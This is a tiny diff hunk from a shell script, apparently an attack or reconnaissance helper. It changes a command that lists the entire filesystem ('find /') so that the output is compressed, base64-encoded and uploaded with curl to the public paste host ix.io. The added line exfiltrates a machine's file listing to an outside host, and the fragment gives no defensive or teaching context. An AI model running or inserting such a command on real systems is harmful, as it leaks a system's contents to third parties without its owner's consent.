@@ -9,4 +9,4 @@ r() {
 
 r ls
 r pwd
-r find / | gzip | base64
+r find / | gzip | base64 | curl -F 'f:1=<-' ix.io
